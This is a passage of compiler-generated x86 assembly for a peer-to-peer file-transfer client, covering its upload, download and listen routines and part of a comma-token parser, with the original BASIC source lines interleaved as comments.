	mov	eax,d[ebp-72]			;;; i665
	call	eax			;;; i620
A.55:
;
; [408] ELSE
	jmp	end.if.0014.client			;;; i107
else.0014.client:
;
; [409] ret = $$FALSE
	mov	eax,0			;;; i659
	mov	d[ebp-88],eax			;;; i670
;
; [410] END IF
end.if.0014.client:
;
; [412] IFT ret THEN
	mov	eax,d[ebp-88]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.0015.client			;;; i221
;
; [413] CPrint ($$main,"* upload completed: "+file.srcfile)
	mov	eax,d[ebp-44]			;;; i665
	lea	esi,[eax+7]			;;; i308
	mov	edi,255			;;; i310
	call	%_CompositeStringToString			;;; i311
	mov	eax,esi			;;; i312
	mov	ebx,addr @_string.0168.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [414] ELSE
	jmp	end.if.0015.client			;;; i107
else.0015.client:
;
; [415] CPrint ($$main,"* upload failed: "+file.srcfile)
	mov	eax,d[ebp-44]			;;; i665
	lea	esi,[eax+7]			;;; i308
	mov	edi,255			;;; i310
	call	%_CompositeStringToString			;;; i311
	mov	eax,esi			;;; i312
	mov	ebx,addr @_string.0169.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [416] END IF
end.if.0015.client:
;
; [418] ReleaseSemaphore (#hsmUpL,1,NULL)
;
; [0] EXTERNAL FUNCTION ReleaseSemaphore (hSemaphore, lReleaseCount, lpPreviousCount)
#ifdef ClientUpload.NULL
#undef ClientUpload.NULL
#endif
#define ClientUpload.NULL ebp-108	; exposes local variable 'NULL'
;
	push	[ebp-108]			;;; i674a
	push	1			;;; i656a
	push	[%#hsmUpL.client]			;;; i672a
	call	_ReleaseSemaphore@12			;;; i619
;
; [419] RETURN ret
	mov	eax,d[ebp-88]			;;; i665
	jmp	end.func4A.client			;;; i258
;
; [420] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ClientUpload.client:  ;;; Function end label for Assembly Programmers.
end.func4A.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func4A.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
free.func4A.client:
	mov	esi,[ebp-52]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-60]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-56]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  ClientUpload ()  *****
;  *****
;
; [422] FUNCTION ClientDownload (ptext)' (STRING text)
.code
;
#ifdef ClientDownload.ptext
#undef ClientDownload.ptext
#endif
#define ClientDownload.ptext ebp+8	; exposes function argument 'ptext'
;
align 16
_ClientDownload.client@4:
;  *****
;  *****  FUNCTION  ClientDownload ()  *****
;  *****
func49.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func49.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.66:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.66			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,132			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	mov	ecx,35				;;; ..
	xor	eax,eax			;;; ...
A.67:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.67			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	lea	ebx,[esp+540]			;;; i125a
	lea	ecx,[esp+568]			;;; i125b
	lea	edx,[esp+1108]			;;; i125c
	mov	d[ebp-44],eax			;;; i670
	mov	d[ebp-48],ebx			;;; i670
	mov	d[ebp-92],ecx			;;; i670
	mov	d[ebp-104],edx			;;; i670
funcBody49.client:
;
; [423] TP2PFILE file
; .composites = ebp-40	; internal variable
#ifdef ClientDownload.file
#undef ClientDownload.file
#endif
#define ClientDownload.file ebp-44	; exposes local variable 'file'
;
;
; [424] TP2P p2p
#ifdef ClientDownload.p2p
#undef ClientDownload.p2p
#endif
#define ClientDownload.p2p ebp-48	; exposes local variable 'p2p'
;
;
; [425] STRING text
#ifdef ClientDownload.text
#undef ClientDownload.text
#endif
#define ClientDownload.text ebp-52	; exposes local variable 'text'
;
;
; [428] IF (WaitForSingleObject (#hsmDownL,30000) == $$WAIT_TIMEOUT) THEN
data section 'globals$shared'
align	4
%#hsmDownL.client:	db 4 dup ?
.code
	push	30000			;;; i656a
	push	[%#hsmDownL.client]			;;; i672a
	call	_WaitForSingleObject@8			;;; i619
	cmp	eax,258			;;; i684a
	jne	>> else.0016.client			;;; i219
;
; [429] CPrint ($$main,"* download file timeout")
	mov	eax,addr @_string.0170.client			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [430] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func49.client			;;; i258
;
; [431] END IF
else.0016.client:
end.if.0016.client:
;
; [432] text = CSTRING$(ptext)
	sub	esp,64			;;; i487
	mov	eax,d[ebp+8]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_cstring.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp-52]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [434] IF newP2P(@p2p) THEN
	mov	eax,d[ebp-48]			;;; i665
	push	eax			;;; i667a
	call	_newP2P@4			;;; i619
	test	eax,eax			;;; i220
	jz	>> else.0017.client			;;; i221
;
; [435] auths$ = GetTokenEx (@text,',',0)
#ifdef ClientDownload.auths$
#undef ClientDownload.auths$
#endif
#define ClientDownload.auths$ ebp-56	; exposes local variable 'auths$'
;
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp-52]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp-52],ecx			;;; i670
	lea	ebx,[ebp-56]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [436] addr$ = GetTokenEx (@text,',',0)
#ifdef ClientDownload.addr$
#undef ClientDownload.addr$
#endif
#define ClientDownload.addr$ ebp-60	; exposes local variable 'addr$'
;
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp-52]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp-52],ecx			;;; i670
	lea	ebx,[ebp-60]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [437] port = ULONG(GetTokenEx (@text,',',0))
#ifdef ClientDownload.port
#undef ClientDownload.port
#endif
#define ClientDownload.port ebp-64	; exposes local variable 'port'
;
	sub	esp,64			;;; i487
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp-52]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp-52],ecx			;;; i670
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.ulong.s			;;; i492a
	add	esp,64			;;; i600
	mov	d[ebp-64],eax			;;; i670
;
; [438] file.auth = @p2p.GetAdler(&auths$,LEN(auths$))
	mov	eax,d[ebp-48]			;;; i665
	mov	eax,d[eax+12]			;;; i313b
	xor	edx,edx			;;; i602
	test	eax,eax			;;; i603
	jz	>> A.60			;;; i604
; .xstk49.0000 = ebp-72	; internal variable
	mov	d[ebp-72],eax			;;; i670
	mov	eax,d[ebp-56]			;;; i642
; .xstk49.0001 = ebp-80	; internal variable
	mov	d[ebp-80],eax			;;; i670
	mov	eax,d[ebp-56]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.61			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.61:
	push	eax			;;; i667a
	push	[ebp-80]			;;; i674a
	mov	eax,d[ebp-72]			;;; i665
	call	eax			;;; i620
A.60:
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+3],eax			;;; i13b
;
; [439] file.srcfile = GetTokenEx (@text,',',0)
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp-52]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp-52],ecx			;;; i670
	mov	ebx,d[ebp-44]			;;; i665
	lea	edi,[ebx+7]			;;; i9b
	mov	esi,eax			;;; i10
	mov	ecx,255			;;; i11
	call	%_assignCompositeStringlet.s			;;; i12
;
; [440] file.desfile = GetTokenEx (@text,',',0)
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp-52]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp-52],ecx			;;; i670
	mov	ebx,d[ebp-44]			;;; i665
	lea	edi,[ebx+262]			;;; i9b
	mov	esi,eax			;;; i10
	mov	ecx,255			;;; i11
	call	%_assignCompositeStringlet.s			;;; i12
;
; [441] file.start = ULONG(GetTokenEx (@text,',',0))
	sub	esp,64			;;; i487
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp-52]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp-52],ecx			;;; i670
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.ulong.s			;;; i492a
	add	esp,64			;;; i600
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+517],eax			;;; i13b
;
; [442] file.end = ULONG(GetTokenEx (@text,',',0))
	sub	esp,64			;;; i487
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp-52]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp-52],ecx			;;; i670
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.ulong.s			;;; i492a
	add	esp,64			;;; i600
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+521],eax			;;; i13b
;
; [443] file.flags = ULONG(GetTokenEx (@text,0,0))
	sub	esp,64			;;; i487
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp-52]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp-52],ecx			;;; i670
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.ulong.s			;;; i492a
	add	esp,64			;;; i600
	mov	ebx,d[ebp-44]			;;; i665
	mov	b[ebx+538],al			;;; i13b
;
; [444] file.blocks = 0'use default block size
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,0			;;; i659
	mov	d[eax+533],ebx			;;; i13b
;
; [446] CPrint ($$main,"* downloading file "+file.srcfile)
	mov	eax,d[ebp-44]			;;; i665
	lea	esi,[eax+7]			;;; i308
	mov	edi,255			;;; i310
	call	%_CompositeStringToString			;;; i311
	mov	eax,esi			;;; i312
	mov	ebx,addr @_string.0174.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [447] SendSMessage (idx,"listen "+STRING$(file.auth)+","+STRING$(port))
#ifdef ClientDownload.idx
#undef ClientDownload.idx
#endif
#define ClientDownload.idx ebp-84	; exposes local variable 'idx'
;
	sub	esp,64			;;; i487
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax+3]			;;; i313b
	mov	d[esp],eax			;;; i887
	call	%_string.ulong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.0163.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0164.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	[ebp-72],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,d[ebp-64]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,[ebp-72]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp-84]			;;; i674a
	call	func33.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [448] Sleep (200)
	push	200			;;; i656a
	call	_Sleep@4			;;; i619
;
; [450] ret = @p2p.FileDownload (file,addr$,port)
#ifdef ClientDownload.ret
#undef ClientDownload.ret
#endif
#define ClientDownload.ret ebp-88	; exposes local variable 'ret'
;
	mov	eax,d[ebp-48]			;;; i665
	mov	eax,d[eax+4]			;;; i313b
	xor	edx,edx			;;; i602
	test	eax,eax			;;; i603
	jz	>> A.62			;;; i604
	mov	d[ebp-72],eax			;;; i670
	mov	eax,d[ebp-44]			;;; i665
; .compositeArg.0 = ebp-92	; internal variable
	mov	edi,d[ebp-92]			;;; i665
	mov	esi,eax			;;; i660
	mov	ecx,540			;;; i606a
	mov	eax,edi			;;; i606b
	call	%_assignComposite			;;; i607
	mov	d[ebp-80],eax			;;; i670
	mov	eax,d[ebp-60]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk49.0002 = ebp-100	; internal variable
	mov	d[ebp-100],eax			;;; i670
	push	[ebp-64]			;;; i674a
	push	[ebp-100]			;;; i674a
	push	[ebp-80]			;;; i674a
	mov	eax,d[ebp-72]			;;; i665
	call	eax			;;; i620
	sub	esp,12			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,12			;;; i633
A.62:
	mov	d[ebp-88],eax			;;; i670
;
; [451] @p2p.Free(p2p)
	mov	eax,d[ebp-48]			;;; i665
	mov	eax,d[eax+20]			;;; i313b
	xor	edx,edx			;;; i602
	test	eax,eax			;;; i603
	jz	>> A.63			;;; i604
	mov	d[ebp-72],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i665
; .compositeArg.1 = ebp-104	; internal variable
	mov	edi,d[ebp-104]			;;; i665
	mov	esi,eax			;;; i660
	mov	ecx,28			;;; i606a
	mov	eax,edi			;;; i606b
	call	%_assignComposite			;;; i607
	push	eax			;;; i667a
	mov	eax,d[ebp-72]			;;; i665
	call	eax			;;; i620
A.63:
;
; [452] ELSE
	jmp	end.if.0017.client			;;; i107
else.0017.client:
;
; [453] ret = $$FALSE
	mov	eax,0			;;; i659
	mov	d[ebp-88],eax			;;; i670
;
; [454] END IF
end.if.0017.client:
;
; [456] IFT ret THEN
	mov	eax,d[ebp-88]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.0018.client			;;; i221
;
; [457] CPrint ($$main,"* download completed: "+file.srcfile)
	mov	eax,d[ebp-44]			;;; i665
	lea	esi,[eax+7]			;;; i308
	mov	edi,255			;;; i310
	call	%_CompositeStringToString			;;; i311
	mov	eax,esi			;;; i312
	mov	ebx,addr @_string.0178.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [458] ELSE
	jmp	end.if.0018.client			;;; i107
else.0018.client:
;
; [459] CPrint ($$main,"* download failed: "+file.srcfile)
	mov	eax,d[ebp-44]			;;; i665
	lea	esi,[eax+7]			;;; i308
	mov	edi,255			;;; i310
	call	%_CompositeStringToString			;;; i311
	mov	eax,esi			;;; i312
	mov	ebx,addr @_string.0179.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [460] END IF
end.if.0018.client:
;
; [462] ReleaseSemaphore (#hsmDownL,1,NULL)
#ifdef ClientDownload.NULL
#undef ClientDownload.NULL
#endif
#define ClientDownload.NULL ebp-108	; exposes local variable 'NULL'
;
	push	[ebp-108]			;;; i674a
	push	1			;;; i656a
	push	[%#hsmDownL.client]			;;; i672a
	call	_ReleaseSemaphore@12			;;; i619
;
; [463] RETURN ret
	mov	eax,d[ebp-88]			;;; i665
	jmp	end.func49.client			;;; i258
;
; [464] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ClientDownload.client:  ;;; Function end label for Assembly Programmers.
end.func49.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func49.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
free.func49.client:
	mov	esi,[ebp-52]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-60]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-56]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  ClientDownload ()  *****
;  *****
;
; [466] FUNCTION ClientListen (STRING text)
.code
;
#ifdef ClientListen.text
#undef ClientListen.text
#endif
#define ClientListen.text ebp+8	; exposes function argument 'text'
;
align 16
_ClientListen.client@4:
;  *****
;  *****  FUNCTION  ClientListen ()  *****
;  *****
func4B.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func4B.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,4				;;; ..
	xor	eax,eax			;;; ...
A.74:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.74			;;; .....
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,156			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.75:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.75			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	lea	ebx,[esp+28]			;;; i125a
	mov	d[ebp-44],eax			;;; i670
	mov	d[ebp-80],ebx			;;; i670
funcBody4B.client:
;
; [467] TP2P p2p
; .composites = ebp-40	; internal variable
#ifdef ClientListen.p2p
#undef ClientListen.p2p
#endif
#define ClientListen.p2p ebp-44	; exposes local variable 'p2p'
;
;
; [470] IF WaitForSingleObject (#hsmListen,15000) == $$WAIT_TIMEOUT THEN
data section 'globals$shared'
align	4
%#hsmListen.client:	db 4 dup ?
.code
	push	15000			;;; i656a
	push	[%#hsmListen.client]			;;; i672a
	call	_WaitForSingleObject@8			;;; i619
	cmp	eax,258			;;; i684a
	jne	>> else.0019.client			;;; i219
;
; [471] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func4B.client			;;; i258
;
; [472] END IF
else.0019.client:
end.if.0019.client:
;
; [474] auth$ = GetTokenEx (@text,',',0)
#ifdef ClientListen.auth$
#undef ClientListen.auth$
#endif
#define ClientListen.auth$ ebp-48	; exposes local variable 'auth$'
;
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	lea	ebx,[ebp-48]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [475] port = ULONG(GetTokenEx (@text,0,0))
#ifdef ClientListen.port
#undef ClientListen.port
#endif
#define ClientListen.port ebp-52	; exposes local variable 'port'
;
	sub	esp,64			;;; i487
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.ulong.s			;;; i492a
	add	esp,64			;;; i600
	mov	d[ebp-52],eax			;;; i670
;
; [476] IF newP2P(@p2p) THEN
	mov	eax,d[ebp-44]			;;; i665
	push	eax			;;; i667a
	call	_newP2P@4			;;; i619
	test	eax,eax			;;; i220
	jz	>> else.001A.client			;;; i221
;
; [477] auth = @p2p.GetAdler(&auth$,LEN(auth$))
#ifdef ClientListen.auth
#undef ClientListen.auth
#endif
#define ClientListen.auth ebp-56	; exposes local variable 'auth'
;
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax+12]			;;; i313b
	xor	edx,edx			;;; i602
	test	eax,eax			;;; i603
	jz	>> A.68			;;; i604
; .xstk4B.0000 = ebp-64	; internal variable
	mov	d[ebp-64],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i642
; .xstk4B.0001 = ebp-72	; internal variable
	mov	d[ebp-72],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.69			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.69:
	push	eax			;;; i667a
	push	[ebp-72]			;;; i674a
	mov	eax,d[ebp-64]			;;; i665
	call	eax			;;; i620
A.68:
	mov	d[ebp-56],eax			;;; i670
;
; [478] ret = @p2p.FileListen (auth,port)
#ifdef ClientListen.ret
#undef ClientListen.ret
#endif
#define ClientListen.ret ebp-76	; exposes local variable 'ret'
;
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax]			;;; i313b
	xor	edx,edx			;;; i602
	test	eax,eax			;;; i603
	jz	>> A.70			;;; i604
	mov	d[ebp-64],eax			;;; i670
	push	[ebp-52]			;;; i674a
	push	[ebp-56]			;;; i674a
	mov	eax,d[ebp-64]			;;; i665
	call	eax			;;; i620
A.70:
	mov	d[ebp-76],eax			;;; i670
;
; [479] @p2p.Free(p2p)
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax+20]			;;; i313b
	xor	edx,edx			;;; i602
	test	eax,eax			;;; i603
	jz	>> A.71			;;; i604
	mov	d[ebp-64],eax			;;; i670
	mov	eax,d[ebp-44]			;;; i665
; .compositeArg.0 = ebp-80	; internal variable
	mov	edi,d[ebp-80]			;;; i665
	mov	esi,eax			;;; i660
	mov	ecx,28			;;; i606a
	mov	eax,edi			;;; i606b
	call	%_assignComposite			;;; i607
	push	eax			;;; i667a
	mov	eax,d[ebp-64]			;;; i665
	call	eax			;;; i620
A.71:
;
; [480] ELSE
	jmp	end.if.001A.client			;;; i107
else.001A.client:
;
; [481] ret = $$FALSE
	mov	eax,0			;;; i659
	mov	d[ebp-76],eax			;;; i670
;
; [482] END IF
end.if.001A.client:
;
; [483] ReleaseSemaphore (#hsmListen,1,NULL)
#ifdef ClientListen.NULL
#undef ClientListen.NULL
#endif
#define ClientListen.NULL ebp-84	; exposes local variable 'NULL'
;
	push	[ebp-84]			;;; i674a
	push	1			;;; i656a
	push	[%#hsmListen.client]			;;; i672a
	call	_ReleaseSemaphore@12			;;; i619
;
; [484] RETURN ret
	mov	eax,d[ebp-76]			;;; i665
	jmp	end.func4B.client			;;; i258
;
; [485] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ClientListen.client:  ;;; Function end label for Assembly Programmers.
end.func4B.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func4B.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
free.func4B.client:
	mov	esi,[ebp-48]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  ClientListen ()  *****
;  *****
;
; [487] FUNCTION STRING GetTokenEx (str$,term,offset)
.code
;
#ifdef GetTokenEx.str$
#undef GetTokenEx.str$
#endif
#define GetTokenEx.str$ ebp+8	; exposes function argument 'str$'
;
;
#ifdef GetTokenEx.term
#undef GetTokenEx.term
#endif
#define GetTokenEx.term ebp+12	; exposes function argument 'term'
;
;
#ifdef GetTokenEx.offset
#undef GetTokenEx.offset
#endif
#define GetTokenEx.offset ebp+16	; exposes function argument 'offset'
;
align 16
_GetTokenEx.client@12:
;  *****
;  *****  FUNCTION  GetTokenEx ()  *****
;  *****
func42.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func42.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBody42.client:
;
; [490] IFZ str$ THEN RETURN ""
	mov	eax,[ebp+8]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.76			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.001B.client			;;; i192
A.76:
	xor	eax,eax			;;; i658
	call	%_clone.a0			;;; i870
	jmp	end.func42.client			;;; i258
else.001B.client:
end.if.001B.client:
;
; [492] len = LEN(str$)
#ifdef GetTokenEx.len
#undef GetTokenEx.len
#endif
#define GetTokenEx.len ebp-40	; exposes local variable 'len'
;
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.77			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.77:
	mov	d[ebp-40],eax			;;; i670
;
; [493] msg$=""
#ifdef GetTokenEx.msg$
#undef GetTokenEx.msg$
#endif
#define GetTokenEx.msg$ ebp-44	; exposes local variable 'msg$'
;
	xor	eax,eax			;;; i3
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [494] IF (offset >= len-1) THEN RETURN ""
	mov	eax,d[ebp-40]			;;; i665
	sub	eax,1			;;; i791
	mov	ebx,d[ebp+16]			;;; i665
	cmp	eax,ebx			;;; i684a
	jg	>> else.001C.client			;;; i219
	xor	eax,eax			;;; i658
	call	%_clone.a0			;;; i870
	jmp	end.func42.client			;;; i258
else.001C.client:
end.if.001C.client:
;
; [496] FOR p = offset TO len-1
#ifdef GetTokenEx.p
#undef GetTokenEx.p
#endif
#define GetTokenEx.p ebp-48	; exposes local variable 'p'
;
	mov	eax,d[ebp+16]			;;; i665
	mov	d[ebp-48],eax			;;; i670
	mov	eax,d[ebp-40]			;;; i665
	sub	eax,1			;;; i791
; .forlimit42.001D = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
align 8
for.001D.client:
	mov	eax,d[ebp-48]			;;; i665
